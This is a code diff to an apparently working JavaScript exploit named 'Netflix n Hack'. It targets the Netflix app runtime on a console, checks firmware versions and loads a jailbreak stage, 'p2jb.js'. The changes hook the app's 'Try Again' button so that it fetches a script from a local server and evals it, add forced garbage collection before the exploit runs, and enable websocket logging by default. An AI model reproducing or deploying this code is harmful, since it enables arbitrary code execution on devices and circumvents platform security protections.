@@ -189,11 +189,19 @@ const ws = {
         this.socket = new nrdp.WebSocket(`wss://pwn.netflix.com:${port}`);
         this.socket.onopen = callback;
     },
+    is_open() {
+        return this.socket && this.socket.readyState !== this.socket.CLOSED;
+    },
     send(msg) {
-        if (this.socket && this.socket.readyState !== this.socket.CLOSED) {
+        if (this.is_open()) {
             this.socket.send(msg);
         }
-    }
+    },
+    close() {
+        if (this.is_open()) {
+            this.socket.close()
+        }
+    },
 };
 // #endregion
 // #region Logger
@@ -542,48 +550,47 @@ class gadgets {
 };
 
 function hook_tryagain(){
-        /***** Hook "Try Again" button to reload exploit *****/
-        if (typeof util !== 'undefined' && util.changeLocation) {
-            const original_changeLocation = util.changeLocation;
-            util.changeLocation = function(url) {
-                logger.log("Reloading Javascript...");
+    /***** Hook "Try Again" button to reload exploit *****/
+    if (typeof util !== 'undefined' && util.changeLocation) {
+        const original_changeLocation = util.changeLocation;
+        util.changeLocation = function(url) {
+            logger.log("Reloading Javascript...");
 
+            logger.flush();
+            ws.close();
+
+            // Load and eval our injected script instead of reloading app
+            nrdp.gibbon.load({
+                url: 'http://127.0.0.1:40002/js/common/config/text/config.text.lruderrorpage.en.js',
+                secure: false
+            }, function(result) {
                 logger.flush();
 
-                // Load and eval our injected script instead of reloading app
-                nrdp.gibbon.load({
-                    url: 'http://127.0.0.1:40002/js/common/config/text/config.text.lruderrorpage.en.js',
-                    secure: false
-                }, function(result) {
+                if (result.data) {
                     logger.flush();
-
-                    if (result.data) {
-                        logger.flush();
-                        try {
-                            eval(result.data);
-                        } catch (e) {
-                            logger.log("Eval error: " + e.message);
-                            logger.log("Stack: " + (e.stack || "none"));
-                            logger.flush();
-                        }
-                    } else {
-                        logger.log("Load failed - no data received");
+                    try {
+                        eval(result.data);
+                    } catch (e) {
+                        logger.log("Eval error: " + e.message);
+                        logger.log("Stack: " + (e.stack || "none"));
                         logger.flush();
                     }
-                });
+                } else {
+                    logger.log("Load failed - no data received");
+                    logger.flush();
+                }
+            });
 
-                // Throw exception to stop execution and prevent state.exit
-                throw new Error("Exploit reload initiated");
-            };
-            logger.log("Enabled Instant JS reload...");
-            logger.flush();
-        } else {
-            logger.log("WARNING: util.changeLocation not found!");
-            logger.flush();
-        }
+            // Throw exception to stop execution and prevent state.exit
+            throw new Error("Exploit reload initiated");
+        };
+        logger.log("Enabled Instant JS reload...");
+        logger.flush();
+    } else {
+        logger.log("WARNING: util.changeLocation not found!");
+        logger.flush();
     }
-
-
+}
 
 function stringToBytes (str) {
     const len = str.length;
@@ -598,11 +605,17 @@ function sleep(ms) {
     nrdp.setTimeout(() => {}, ms);
 }
 
-function main () {
+async function main () {
 
     logger.init();
 
     logger.log("=== Netflix n Hack ===");
+
+    await nrdp.gibbon.garbageCollect();
+    await nrdp.gibbon.garbageCollect();
+    await nrdp.gibbon.garbageCollect();
+    await nrdp.gibbon.garbageCollect();
+
     logger.flush(); // Force immediate display
 
     try {
@@ -1759,7 +1772,7 @@ function main () {
             logger.log("Unsupported FW_VERSION: " + FW_VERSION);
             send_notification("Unsupported FW_VERSION: " + FW_VERSION);
         } else if (compare_version(FW_VERSION, "10.01") > 0) {
-            logger.disableWidget();
+            // logger.disableWidget();
 
             var script_name = "p2jb.js";
             logger.log("loading " + script_name);
@@ -1797,5 +1810,12 @@ function main () {
     }
 }
 
-// ws.init(ip_script, 1337, () => { logger.log("Websocket initiated successfully"); main();});// uncomment this to enable WebSocket logging
-main();
+const enable_websocket_logging = true;
+if (enable_websocket_logging && !ws.is_open()) {
+    ws.init(ip_script, 1337, () => {
+        logger.log("Websocket initiated successfully");
+        main();
+    });
+} else {
+    main();
+}
